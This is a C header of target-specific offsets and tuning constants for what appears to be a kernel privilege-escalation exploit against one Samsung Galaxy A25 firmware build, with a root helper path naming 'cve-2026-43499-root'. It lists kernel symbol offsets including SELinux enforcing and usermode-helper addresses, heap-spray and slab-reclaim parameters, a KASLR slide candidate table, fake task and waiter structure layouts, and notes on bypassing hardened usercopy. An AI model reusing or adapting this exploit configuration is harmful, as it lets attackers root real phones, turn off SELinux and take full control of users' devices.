#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "a25x-A256EXXSADZA2-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "a25x-A256EXXSADZA2-root-umh-pi-safe"
#endif
#define RMG_BUILD_ID "a256e-A256EXXSADZA2-standalone-root"
#define DEFAULT_EXPLOIT_ATTEMPTS 1
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/a25xdxx/a25x:16/BP2A.250605.031.A3/A256EXXSADZA2:user/release-keys"
#endif

#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
/*
 * Phys map notes (A256EXXSADZA2 / Exynos 1280):
 * - DRAM base verified via /proc/zoneinfo start_pfn=0x80000 (2GB DRAM base).
 * - Follows the Exynos RMG convention (e1s/S921, A56, A536E): P0_PHYS_OFFSET
 *   0x80000000, kernel image loaded at 0x80000000 (text_offset 0).
 */
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
/*
 * unix_stream_sendmsg (this 5.10 Image) for SKB_SEND_SIZE=ORDER3*2=0x10000:
 *   v20 = min(36480, send) = 36480
 *   v21 = page-aligned paged part = 32768
 *   linear headroom = v20 - v21 = 3712 = 0xe80
 * Verified in the target disassembly: mov w9,#0x8e80 / sub w8,w28,#0xe80.
 * So payload starts at page_base - 0xe80 (NOT -0x1000).
 */
#define SKB_DATA_DELTA (-0xe80LL)

/*
 * IDA mm_cache_init:
 *   kmem_cache_create_usercopy("mm_struct", 960, ...)
 * SLUB object size is 960 (0x3c0). mm_alloc only memset()s 952 usable bytes,
 * but KernelSnitch stride MUST match the cache object size, not the memset len.
 */
#define MM_STRUCT_SZ 0x3c0
#define MM_ORDER 3
#define KERNELSNITCH_MTE_ENABLED 1
#define STANDALONE_KERNELSNITCH_MTE_ENABLED 0
#define PSELECT_CONSUMER_SETTLE_USEC 250000
#define PSELECT_CFI_ROUTE_ATTEMPTS 1
#define FOPS_PSELECT_BLOCKING_FDS 1
#define FOPS_PSELECT_TRIGGER_ARMED 1
#define PSELECT_CONSUMER_NICE_FIRST 19
#define FOPS_FAKE_WAITER_PRIO 130
#define FOPS_SYNC_PSELECT_SYSCALL 1
#define FOPS_PSELECT_SYNC_TIMEOUT_USEC 20000
#define FOPS_PSELECT_SYNC_CONFIRMATIONS 3
#define APP_PAYLOAD_ATTEMPT_DELAYS_USEC \
  10000, 20000, 30000, 40000, 50000, 60000, 70000, 80000
/* Cap fork spray — full 32 slabs * 72 tries OOMs A25. */
#define MM_PREPARE_SLABS 12
#define FOPS_SKB_RECLAIM_SENDS 192
#define FOPS_RECLAIM_SNDBUF 16777216
#define FOPS_MM_LATE_DRAIN_TRIGGERS 12
#define FOPS_INTERLEAVE_RECLAIM_SENDS 16
#define FOPS_DEFER_ALL_DRAIN_REAPS 1
#define FOPS_QUIET_RECLAIM_WINDOW 1
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8
#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 4
#define KMALLOC_CGROUP_TYPE 0
#define KMALLOC_CACHE_TYPES 2
#define KMALLOC_PIPE_INDEX 10
#define KMALLOC_PIPE_OBJ_SIZE 0x400
#define PIPE_OBJS_PER_SLAB 32
/*
 * Bulk pipe-only shaping leaves the leaked order-3 page on the buddy
 * freelist. Use socket-interleaved reclaim scaled to this kernel's exact
 * order-3 / 32-object kmalloc-1k geometry (same A25 allocator as the
 * A256EXXUCEZE6 build; a53x/A25 series share the 5.10 kmalloc geometry):
 *
 *   mm order-3 -> exact 32KiB AF_UNIX carrier -> kmalloc-1k pipe slab
 */
#define PIPE_SOCKET_INTERLEAVE_RECLAIM 1
#define PIPE_BUDDY_DRAIN_COUNT 384
#define PIPE_SOCKET_CARRIER_COUNT 12
#define PIPE_SOCKET_HEAD_BASE_COUNT 1056
#define PIPE_SOCKET_HEAD_HIDDEN_MARGIN 96
#define PIPE_SOCKET_HEAD_MAX_COUNT 2048
#define PIPE_RECLAIM_SLABS 13
#define PIPE_MAX_ATTEMPTS 1
/*
 * Samsung's 960-byte mm_struct cache uses cpu_partial=13. Pair one held
 * prep-slab free with each carrier allocation to drain the per-CPU list.
 */
#define PIPE_MM_LATE_DRAIN_TRIGGERS 12
/*
 * A256EXXSADZA2 has CONFIG_HARDENED_USERCOPY=y without fallback.  The
 * configfs bootstrap therefore cannot copy directly to/from the generic
 * kmalloc cache that owns struct pipe_buffer: __check_heap_object() BUGs.
 *
 * Exact offsets below are from this firmware's __check_heap_object
 * disassembly (vmlinux ffffffc00833d330):
 *   flags      [kmem_cache + 0x08]
 *   size       [kmem_cache + 0x18]
 *   useroffset [kmem_cache + 0xf4]
 *   usersize   [kmem_cache + 0xf8]
 *
 * Temporarily redirect only the reclaimed pipe slab's slab_cache
 * pointer to a zeroed descriptor in the stable order-3 page, whitelists one
 * 0x400-byte object, then restores the original pointer before pipe teardown.
 * Keep the descriptor inside object 32's exact mm_struct usercopy window
 * (mm_cache_init: offset 0x168, size 0x170) as a defense-in-depth measure if
 * stale slab metadata is observed while configfs seeds the descriptor.
 */
#define PIPE_HARDENED_USERCOPY_CACHE_SHIM 1
#define PIPE_FAKE_KMEM_CACHE_OFF 0x7968
#define PIPE_FAKE_KMEM_CACHE_BYTES 0x100
#define PIPE_KMEM_CACHE_FLAGS_OFF 0x08
#define PIPE_KMEM_CACHE_SIZE_OFF 0x18
#define PIPE_KMEM_CACHE_USEROFFSET_OFF 0xf4
#define PIPE_KMEM_CACHE_USERSIZE_OFF 0xf8
#define DEFAULT_ATTEMPT_TIMEOUT_SEC 3600
#define LEGACY_RT_MUTEX_WAITER 1

#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_LOCK_OWNER_VALUE 1ULL
#define SLIDE_USE_FAKE_TASK 1
/*
 * On-device runtime value: /sys/kernel/tracing/events/sched/sched_blocked_reason/id
 * reports 104 for A256EXXSADZA2 (5.10.237), matching the ZE6 (5.10.240) build.
 */
#define SLIDE_TRACEFS_EVENT_ID 104
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000fe2f8ULL
#define SLIDE_WORKER_THREAD_OFF 0x000fe238ULL
#define SLIDE_WORKER_THREAD_SIZE 0x600ULL
#define SLIDE_MAX_OFFSET 0x1f8000ULL
#define SLIDE_ALIGN_MASK 0x7fffULL
/*
 * Measured from the r21 panic stack on the ZE6 build; A256EXXSADZA2 is the
 * same A25 series with the same 5.10 pselect6/do_pselect stack layout.
 */
#define SLIDE_PSELECT_WORD_SHIFT 6
/* The standalone FOPS route must stamp the waiter using the measured shift. */
#define FOPS_PSELECT_FULL_WAITER_STAMP 1
/*
 * configfs_read_file/configfs_write_bin_file use the classic
 * (file, user_buffer, count, ppos) ABI on this 5.10 kernel.  r22 proved that
 * putting them in read_iter/write_iter dispatches a kiocb as argument zero.
 */
#define CONFIGFS_CLASSIC_RW_FOPS 1
/*
 * This kernel's optimized strscpy() stores a complete masked 8-byte word when
 * it encounters NUL.  The ashmem suffix starts at area+0xb, while both the
 * configfs page pointer (area+0x10) and bin_buffer pointer (area+0x58) begin at
 * suffix offset 5 modulo 8.  Zeroing fields before either pointer therefore
 * clears its first three bytes.  Keep those bytes intentionally zero and use
 * the file position for the low 24 bits of the requested address.
 */
#define CONFIGFS_ASHMEM_LOW24_POSITION 1
/*
 * The first vmemmap metadata read can target ffffffff008eda08, while the
 * ordinary low-24 split selected base ffffffff00000000.  Its little-endian
 * form begins 00 00 00 00; the fourth NUL starts a new strscpy word and wipes
 * the remaining ff bytes, leaving buffer->page == NULL.  Bias the file
 * position by one more 16MiB window whenever address byte 3 is zero.
 */
#define CONFIGFS_ASHMEM_REBASE_ZERO_BYTE3 1
/*
 * bin_buffer_size starts five bytes into the same strscpy word pattern.  Its
 * first three bytes must be nonzero so staging a NUL cannot clear the rest of
 * the signed 32-bit size.  util.c rounds the available size upward without
 * changing the pwrite position or requested length.
 */
#define CONFIGFS_ASHMEM_PAD_BUFFER_SIZE 1
/* 32KiB kaslr granule observed on the A25 series (e.g. live slide 0x1f8000). */
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x008000ULL, 0x010000ULL, 0x018000ULL, \
  0x020000ULL, 0x028000ULL, 0x030000ULL, 0x038000ULL, \
  0x040000ULL, 0x048000ULL, 0x050000ULL, 0x058000ULL, \
  0x060000ULL, 0x068000ULL, 0x070000ULL, 0x078000ULL, \
  0x080000ULL, 0x088000ULL, 0x090000ULL, 0x098000ULL, \
  0x0a0000ULL, 0x0a8000ULL, 0x0b0000ULL, 0x0b8000ULL, \
  0x0c0000ULL, 0x0c8000ULL, 0x0d0000ULL, 0x0d8000ULL, \
  0x0e0000ULL, 0x0e8000ULL, 0x0f0000ULL, 0x0f8000ULL, \
  0x100000ULL, 0x108000ULL, 0x110000ULL, 0x118000ULL, \
  0x120000ULL, 0x128000ULL, 0x130000ULL, 0x138000ULL, \
  0x140000ULL, 0x148000ULL, 0x150000ULL, 0x158000ULL, \
  0x160000ULL, 0x168000ULL, 0x170000ULL, 0x178000ULL, \
  0x180000ULL, 0x188000ULL, 0x190000ULL, 0x198000ULL, \
  0x1a0000ULL, 0x1a8000ULL, 0x1b0000ULL, 0x1b8000ULL, \
  0x1c0000ULL, 0x1c8000ULL, 0x1d0000ULL, 0x1d8000ULL, \
  0x1e0000ULL, 0x1e8000ULL, 0x1f0000ULL, 0x1f8000ULL
#define SLIDE_MAX_ATTEMPTS 64

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS 8
#define PSELECT_ENTER_DELAY_USEC 50000
#define SLIDE_PSELECT_TIMEOUT_NSEC 200000000L
#define SLIDE_KSNITCH_APPENDED_FUTEXES 1024
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f8000ULL
#define P0_FINGERPRINT_HEADER \
  "targets/a25x-A256EXXSADZA2/p0_fingerprint.h"
#endif

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffffc000000000ULL
#define VMEMMAP_START 0xfffffffeffe00000ULL

/* Symbol offsets from vmlinux.elf / Image A256EXXSADZA2 (base 0xffffffc008000000) */
#define ASHMEM_MISC_FOPS_OFF 0x01ffbbe0ULL
#define ASHMEM_FOPS_OFF 0x01b0a498ULL
#define ASHMEM_IOCTL_OFF 0x00c3742cULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00c37d80ULL
#define ASHMEM_MMAP_OFF 0x00c37dd8ULL
#define ASHMEM_OPEN_OFF 0x00c38008ULL
#define ASHMEM_RELEASE_OFF 0x00c3808cULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00c381acULL
/* configfs still uses classic read/write fops on this 5.10 build (not *_iter) */
#define CONFIGFS_READ_ITER_OFF 0x00447488ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x004478e8ULL
#define COPY_SPLICE_READ_OFF 0x003c3ad8ULL
#define NOOP_LLSEEK_OFF 0x003789dcULL
#define INIT_TASK_OFF 0x01e0dd00ULL
#define ROOT_TASK_GROUP_OFF 0x02092080ULL
#define SELINUX_ENFORCING_OFF 0x021ddb68ULL
#define KMALLOC_CACHES_OFF 0x01b4ff40ULL
#define SKBUFF_HEAD_CACHE_OFF 0x01b58e18ULL
#define MM_CACHEP_OFF 0x0207f180ULL
#define ANON_PIPE_BUF_OPS_OFF 0x0197e868ULL
#define PIPE_USER_PAGES_SOFT_OFF 0x01f6b770ULL
#define PIPE_USER_PAGES_HARD_OFF 0x02149678ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define SKBUFF_HEAD_CACHE (KIMAGE_TEXT_BASE + SKBUFF_HEAD_CACHE_OFF)
#define MM_CACHEP (KIMAGE_TEXT_BASE + MM_CACHEP_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define PIPE_USER_PAGES_SOFT_IMAGE \
  (KIMAGE_TEXT_BASE + PIPE_USER_PAGES_SOFT_OFF)
#define PIPE_USER_PAGES_HARD_IMAGE \
  (KIMAGE_TEXT_BASE + PIPE_USER_PAGES_HARD_OFF)

#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000f6be4ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x01df9e10ULL
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x0188e4ebULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x01e01370ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x01fbc430ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x02282109ULL

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x2000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_PRIO_OFF 0x40
#define FAKE_WAITER_DEADLINE_OFF 0x48
#define FAKE_WAITER_LAYOUT_SIZE 0x50

#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF 0x310
#define FAKE_TASK_PI_LOCK_OFF 0x86c
#define FAKE_TASK_PI_WAITERS_OFF 0x880
#define FAKE_TASK_PI_TOP_TASK_OFF 0x890
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x898

#define CFG_PAGE_OFF 0x10
#define CFG_NEEDS_READ_FILL_OFF 0x50
#define CFG_BIN_BUFFER_OFF 0x58
#define CFG_BIN_BUFFER_SIZE_OFF 0x60
#define CFG_CB_MAX_SIZE_OFF 0x64

#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x58
#define PWQ_MAX_ACTIVE_OFF 0x5c
#define POOL_WORKLIST_OFF 0x20
#define POOL_NR_IDLE_OFF 0x34

#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30

#define PIPE_BUFFER_SLOTS 16
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif